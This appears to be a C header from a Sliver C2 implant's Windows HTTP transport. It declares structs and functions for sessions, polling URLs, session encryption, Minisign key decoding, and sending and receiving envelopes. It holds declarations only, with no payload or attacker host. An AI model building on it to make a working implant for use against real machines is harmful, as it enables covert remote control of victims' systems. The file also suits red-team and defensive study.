#pragma once

#define MINISIGN_SIZE (74)
#define RAW_SIG_SIZE (2 + 8 + ED25519_SIGNATURE_SIZE)

typedef enum _HttpMethod {
	GET,
	POST,
	PUT,
	DEL,
	HEAD,
	OPTIONS,
	TRCE,
	CONNECT,
	MERGE,
	PATCH,
	HTTP_DELETE
} HttpMethod;

typedef enum _ContentTy
{
	ApplicationAtomXml,
	ApplicationHttp,
	ApplicationJavascript,
	ApplicationJson,
	ApplicationXjson,
	ApplicationOctetstream,
	ApplicationXWwwFormUrlencoded,
	MultipartFormData,
	Boundary,
	FormData,
	ApplicationXjavascript,
	ApplicationXml,
	MessageHttp,
	Text,
	TextJavascript,
	TextJson,
	TextPlain,
	TextPlainUtf16,
	TextPlainUtf16le,
	TextPlainUtf8,
	TextXjavascript,
	TextXjson,
} ContentTy;

typedef enum _HttpHeader
{
	Accept,
	AcceptCharset,
	AcceptEncoding,
	AcceptLanguage,
	AcceptRanges,
	AccessControlAllowOrigin,
	Age,
	Allow,
	Authorization,
	CacheControl,
	Cookie,
	Connection,
	ContentEncoding,
	ContentLanguage,
	ContentLength,
	ContentLocation,
	ContentMd5,
	ContentRange,
	ContentType,
	ContentDisposition,
	Date,
	Etag,
	Expect,
	Expires,
	From,
	Host,
	IfMatch,
	IfModifiedSince,
	IfNoneMatch,
	IfRange,
	IfUnmodifiedSince,
	LastModified,
	Location,
	MaxForwards,
	Pragma,
	ProxyAuthenticate,
	ProxyAuthorization,
	Range,
	Referer,
	RetryAfter,
	Server,
	SetCookie,
	Te,
	Trailer,
	TransferEncoding,
	Upgrade,
	UserAgent,
	Vary,
	Via,
	Warning,
	WwwAuthenticate,
	UpgradeInsecureRequests,
	HeaderEnumEnd
} HttpHeader;

typedef struct _HTTP_REQUEST {
	LPSTR Method;
	LPSTR lpData;
	DWORD cbData;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	LPSTR Headers[HeaderEnumEnd];
} HTTP_REQUEST, * PHTTP_REQUEST;

typedef struct _HTTP_SESSION {
	HINTERNET hSession;
	PWINHTTP_PROXY_INFO pProxyInfo;
} HTTP_SESSION, * PHTTP_SESSION;

struct _HTTP_CONFIG {
	LPSTR lpUserAgent;
	BOOL DisableUpgradeHeader;
	LPSTR lpAccessToken;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	DWORD dwNumberOfAttemps;
	DWORD dwPollInterval;
	LPSTR AdditionalHeaders[HeaderEnumEnd];
};

typedef struct _HTTP_CLIENT {
	PURI pUri;
	PHTTP_SESSION pHttpSession;
	HINTERNET hConnection;
} HTTP_CLIENT, * PHTTP_CLIENT;

struct _SLIVER_HTTP_CLIENT {
	PHTTP_CONFIG pHttpConfig;
	PHTTP_CLIENT pHttpClient;
	PHTTP_PROFILE pProfile;
	OTP_DATA OtpData;
	LPSTR lpPathPrefix;
	DWORD dwMaxErrors;
};

typedef enum {
	PollType,
	SessionType,
	CloseType
} SegmentType;

typedef struct _HTTP_RESP {
	PBYTE pRespData;
	DWORD cbResp;
	DWORD dwStatusCode;
	HINTERNET hRequest;
} HTTP_RESP, * PHTTP_RESP;

typedef struct _MINISIGN_PUB_KEY {
	BYTE SignatureAlgorithm[2];
	BYTE KeyId[8];
	BYTE PublicKey[32];
} MINISIGN_PUB_KEY, * PMINISIGN_PUB_KEY;

PHTTP_SESSION HttpSessionInit
(
	_In_ PURI pUri,
	_In_ LPWSTR lpProxy,
	_In_ LPWSTR lpProxyBypass
);

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ PHTTP_REQUEST pRequest,
	_In_ LPSTR lpPath,
	_In_ DWORD dwNumberOfAttemps
);

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
);

PBUFFER ReceiveData
(
	_In_ HINTERNET hRequest
);

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
);

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
);

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
);

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
);

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ LPWSTR lpPath,
	_In_ LPSTR Method,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
);

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
);

PMINISIGN_PUB_KEY DecodeMinisignPublicKey
(
	_In_ LPSTR lpInput
);

PBYTE SessionEncrypt
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_Out_ PDWORD pcbCipherText
);

PHTTP_REQUEST CreateHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ LPSTR Method,
	_In_ LPSTR lpData,
	_In_ DWORD cbData
);

LPSTR StartSessionURL
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pClient
);

LPSTR ParseSegmentsUrl
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ SegmentType SegmentType
);

LPSTR CreatePollURL
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pClient
);

LPSTR CreateSessionURL
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pClient
);

PSLIVER_HTTP_CLIENT HttpInit();

BOOL HttpStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
);

PENVELOPE HttpRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
);

BOOL HttpSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient,
	_In_ PENVELOPE pEnvelope
);

BOOL HttpCleanup
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
);

BOOL HttpClose
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
);

PSLIVER_SESSION_CLIENT SessionInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
);

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ LPWSTR lpProxy,
	_In_ LPWSTR lpProxyBypass
);